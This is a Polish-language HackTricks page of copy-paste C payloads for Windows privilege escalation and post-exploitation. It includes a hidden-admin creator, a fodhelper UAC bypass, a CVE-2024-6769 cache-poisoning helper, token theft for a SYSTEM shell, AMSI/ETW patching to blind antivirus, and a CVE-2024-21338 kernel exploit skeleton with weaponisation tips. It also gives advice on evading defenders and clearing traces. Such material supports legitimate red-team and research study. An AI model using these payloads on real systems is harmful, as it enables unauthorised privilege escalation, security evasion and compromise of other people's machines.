# Payloady C dla Windows

{{#include ../../banners/hacktricks-training.md}}

Ta strona zawiera **małe, samodzielne fragmenty kodu C**, przydatne podczas Windows Local Privilege Escalation lub post-exploitation. Każdy payload został zaprojektowany tak, aby można go było łatwo **kopiować i wklejać**, wymaga wyłącznie Windows API / C runtime i można go skompilować za pomocą `i686-w64-mingw32-gcc` (x86) lub `x86_64-w64-mingw32-gcc` (x64).

> ⚠️  Te payloady zakładają, że proces ma już minimalne uprawnienia wymagane do wykonania danej operacji (np. `SeDebugPrivilege`, `SeImpersonatePrivilege` lub kontekst medium-integrity w przypadku UAC bypass). Są przeznaczone do zastosowań **red-team lub CTF**, w których wykorzystanie podatności doprowadziło do uzyskania możliwości wykonywania dowolnego kodu natywnego.

---

## Dodawanie lokalnego użytkownika administratora
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` Registry Hijack (Medium → High integrity)
Gdy zaufany plik binarny **`fodhelper.exe`** zostanie uruchomiony, odczytuje poniższą ścieżkę rejestru **bez filtrowania verbu `DelegateExecute`**. Umieszczając naszą komendę pod tym kluczem, attacker może ominąć UAC *bez zapisywania pliku na dysku*.<sup>[[1]](#references)</sup>

*Ścieżka rejestru odczytywana przez `fodhelper.exe`*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Minimalny PoC uruchamiający `cmd.exe` z podwyższonymi uprawnieniami:
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Testowane na Windows 10 22H2 i Windows 11 23H2 (aktualizacje z lipca 2025 r.). Bypass nadal działa, ponieważ Microsoft nie naprawił brakującej kontroli integralności w ścieżce `DelegateExecute`.*

---

## UAC Bypass – Activation Context Cache Poisoning (`ctfmon.exe`, CVE-2024-6769)
Remapowanie dysku + activation context cache poisoning nadal działa na załatanych kompilacjach Windows 10/11, ponieważ `ctfmon.exe` działa jako zaufany proces interfejsu użytkownika o wysokim poziomie integralności, który bez problemu ładuje pliki z należącego do wywołującego, podszytego dysku `C:` i ponownie wykorzystuje wszelkie przekierowania DLL zapisane w pamięci podręcznej przez `CSRSS`. Abuse przebiega następująco: przekieruj `C:` na kontrolowany przez atakującego magazyn, umieść zmodyfikowany `msctf.dll`, uruchom `ctfmon.exe`, aby uzyskać wysoki poziom integralności, a następnie poproś `CSRSS` o zapisanie w pamięci podręcznej manifestu przekierowującego DLL używaną przez plik binarny uruchamiany automatycznie z podwyższonymi uprawnieniami (np. `fodhelper.exe`), aby przy kolejnym uruchomieniu odziedziczyć swój payload bez monitu UAC.<sup>[[5]](#references)</sup>

Praktyczny przebieg:
1. Przygotuj fałszywe drzewo `%SystemRoot%\System32` i skopiuj legalny plik binarny, który planujesz przejąć (często `ctfmon.exe`).
2. Użyj `DefineDosDevice(DDD_RAW_TARGET_PATH)`, aby ponownie przypisać `C:` wewnątrz swojego procesu, zachowując `DDD_NO_BROADCAST_SYSTEM`, dzięki czemu zmiana pozostanie lokalna.
3. Umieść DLL + manifest w fałszywym drzewie, wywołaj `CreateActCtx/ActivateActCtx`, aby wprowadzić manifest do pamięci podręcznej activation context, a następnie uruchom plik binarny uruchamiany automatycznie z podwyższonymi uprawnieniami, aby przekierował DLL bezpośrednio do Twojego shellcode.
4. Usuń wpis z pamięci podręcznej (`sxstrace ClearCache`) lub uruchom ponownie komputer po zakończeniu, aby zatrzeć ślady atakującego.

<details>
<summary>C - Pomocnik do zatruwania fałszywego dysku + manifestu (CVE-2024-6769)</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")

BOOL WriteWideFile(const wchar_t *path, const wchar_t *data) {
HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if (h == INVALID_HANDLE_VALUE) return FALSE;
DWORD bytes = (DWORD)(wcslen(data) * sizeof(wchar_t));
BOOL ok = WriteFile(h, data, bytes, &bytes, NULL);
CloseHandle(h);
return ok;
}

int wmain(void) {
const wchar_t *stage = L"C:\\Users\\Public\\fakeC\\Windows\\System32";
SHCreateDirectoryExW(NULL, stage, NULL);
CopyFileW(L"C:\\Windows\\System32\\ctfmon.exe", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\ctfmon.exe", FALSE);
CopyFileW(L".\\msctf.dll", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll", FALSE);

DefineDosDeviceW(DDD_RAW_TARGET_PATH | DDD_NO_BROADCAST_SYSTEM,
L"C:", L"\\??\\C:\\Users\\Public\\fakeC");

const wchar_t manifest[] =
L"<?xml version='1.0' encoding='UTF-8' standalone='yes'?>"
L"<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>"
L" <dependency><dependentAssembly>"
L"  <assemblyIdentity name='Microsoft.Windows.Common-Controls' version='6.0.0.0'"
L"   processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*' />"
L"  <file name='advapi32.dll' loadFrom='C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll' />"
L" </dependentAssembly></dependency></assembly>";
WriteWideFile(L"C:\\Users\\Public\\fakeC\\payload.manifest", manifest);

ACTCTXW act = { sizeof(act) };
act.lpSource = L"C:\\Users\\Public\\fakeC\\payload.manifest";
ULONG_PTR cookie = 0;
HANDLE ctx = CreateActCtxW(&act);
ActivateActCtx(ctx, &cookie);

STARTUPINFOW si = { sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
CreateProcessW(L"C:\\Windows\\System32\\ctfmon.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

WaitForSingleObject(pi.hProcess, 2000);
DefineDosDeviceW(DDD_REMOVE_DEFINITION, L"C:", L"\\??\\C:\\Users\\Public\\fakeC");
return 0;
}
```
</details>

Wskazówka dotycząca czyszczenia: po uzyskaniu SYSTEM uruchom `sxstrace Trace -logfile %TEMP%\sxstrace.etl`, a następnie `sxstrace Parse` podczas testów — jeśli w logu widzisz nazwę swojego manifestu, obrońcy również mogą ją zobaczyć, więc zmieniaj ścieżki przy każdym uruchomieniu.

---

## Uruchom SYSTEM shell przez token duplication (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
Jeśli bieżący proces posiada **oba** uprawnienia: `SeDebug` i `SeImpersonate` (co jest typowe dla wielu kont usług), możesz przejąć token z `winlogon.exe`, skopiować go i uruchomić elevated process:
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
Aby uzyskać dokładniejsze wyjaśnienie, jak to działa, zobacz:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## Patchowanie AMSI i ETW w pamięci (Defence Evasion)
Większość nowoczesnych silników AV/EDR polega na **AMSI** i **ETW** do analizowania złośliwych zachowań. Wczesne zastosowanie patcha do obu interfejsów w bieżącym procesie uniemożliwia skanowanie payloadów opartych na skryptach (np. PowerShell, JScript).<sup>[[2]](#references)</sup>
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*Powyższy patch działa lokalnie dla procesu; utworzenie nowego PowerShell po jego uruchomieniu spowoduje wykonanie bez inspekcji AMSI/ETW.*

---

## Utwórz proces potomny jako Protected Process Light (PPL)
Zażądaj poziomu ochrony PPL dla procesu potomnego podczas jego tworzenia, używając `STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL`. Jest to udokumentowane API i operacja powiedzie się tylko wtedy, gdy docelowy obraz jest podpisany dla żądanej klasy signera (Windows/WindowsLight/Antimalware/LSA/WinTcb).<sup>[[3]](#references)[[4]](#references)</sup>
```c
// x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
#include <windows.h>

int wmain(void) {
STARTUPINFOEXW si = {0};
PROCESS_INFORMATION pi = {0};
si.StartupInfo.cb = sizeof(si);

SIZE_T attrSize = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

DWORD lvl = PROTECTION_LEVEL_ANTIMALWARE_LIGHT; // choose the desired level
UpdateProcThreadAttribute(si.lpAttributeList, 0,
PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
&lvl, sizeof(lvl), NULL, NULL);

if (!CreateProcessW(L"C\\\Windows\\\System32\\\notepad.exe", NULL, NULL, NULL, FALSE,
EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
// likely ERROR_INVALID_IMAGE_HASH (577) if the image is not properly signed for that level
return 1;
}
DeleteProcThreadAttributeList(si.lpAttributeList);
HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);
return 0;
}
```
Najczęściej używane poziomy:
- `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
- `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
- `PROTECTION_LEVEL_LSA_LIGHT` (4)

Zweryfikuj wynik za pomocą Process Explorer/Process Hacker, sprawdzając kolumnę Protection.

---

## Local Service -> Kernel przez `appid.sys` Smart-Hash (`IOCTL 0x22A018`, CVE-2024-21338)
`appid.sys` udostępnia obiekt urządzenia (`\\.\\AppID`), którego IOCTL do obsługi smart-hash akceptuje dostarczane przez użytkownika wskaźniki funkcji, gdy proces wywołujący działa jako `LOCAL SERVICE`; Lazarus wykorzystuje to do wyłączenia PPL i ładowania dowolnych sterowników, dlatego zespoły red team powinny mieć gotowy trigger do użycia w labie.<sup>[[6]](#references)</sup>

Uwagi operacyjne:
- Nadal potrzebujesz tokena `LOCAL SERVICE`. Ukradnij go z `Schedule` lub `WdiServiceHost` za pomocą `SeImpersonatePrivilege`, a następnie wykonaj impersonację przed uzyskaniem dostępu do urządzenia, aby kontrole ACL zakończyły się pomyślnie.
- IOCTL `0x22A018` oczekuje struktury zawierającej dwa wskaźniki callbacków (długość zapytania + funkcja odczytu). Wskaż oba na stuby user-mode, które przygotowują nadpisanie tokena lub mapują prymitywy ring-0, ale pozostaw bufory jako RWX, aby KernelPatchGuard nie spowodował awarii w połowie łańcucha.
- Po powodzeniu zakończ impersonację i zamknij uchwyt urządzenia; obrońcy obecnie wyszukują nieoczekiwane uchwyty `Device\\AppID`, więc zamknij go natychmiast po uzyskaniu uprawnień.

<details>
<summary>C - Szkielet triggera do wykorzystania smart-hash w `appid.sys`</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>

typedef struct _APPID_SMART_HASH {
ULONGLONG UnknownCtx[4];
PVOID QuerySize;   // called first
PVOID ReadBuffer;  // called with size returned above
BYTE  Reserved[0x40];
} APPID_SMART_HASH;

DWORD WINAPI KernelThunk(PVOID ctx) {
// map SYSTEM shellcode, steal token, etc.
return 0;
}

int wmain(void) {
HANDLE hDev = CreateFileW(L"\\\\.\\AppID", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
if (hDev == INVALID_HANDLE_VALUE) {
printf("[-] CreateFileW failed: %lu\n", GetLastError());
return 1;
}

APPID_SMART_HASH in = {0};
in.QuerySize = KernelThunk;
in.ReadBuffer = KernelThunk;

DWORD bytes = 0;
if (!DeviceIoControl(hDev, 0x22A018, &in, sizeof(in), NULL, 0, &bytes, NULL)) {
printf("[-] DeviceIoControl failed: %lu\n", GetLastError());
}
CloseHandle(hDev);
return 0;
}
```
</details>

Minimalna poprawka dla weaponized build: zmapuj sekcję RWX za pomocą `VirtualAlloc`, skopiuj tam stub do duplikowania tokenu, ustaw `KernelThunk = section`, a po powrocie `DeviceIoControl` powinieneś mieć uprawnienia SYSTEM, nawet w ramach PPL.

---

## Referencje

- [1] [Pierwszy wpis: powitanie i fileless UAC bypass (fodhelper.exe / ms-settings DelegateExecute)](https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/)
- [2] [Memory Patching AMSI Bypass](https://rastamouse.me/memory-patching-amsi-bypass/)
- [3] [CreateProcessAsPPL – minimalny launcher procesów PPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [4] [Funkcja UpdateProcThreadAttribute (aplikacje Win32) - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute)
- [5] [Nowy łańcuch exploitów umożliwia Windows UAC bypass](https://www.darkreading.com/vulnerabilities-threats/exploit-chain-windows-uac-bypass)
- [6] [Lazarus i rootkit FudModule: poza BYOVD — exploit zero-day umożliwiający przejście od administratora do kernela](https://www.gendigital.com/blog/insights/research/lazarus-and-the-fudmodule-rootkit-beyond-byovd-with-an-admin-to-kernel-zero-day)

{{#include ../../banners/hacktricks-training.md}}
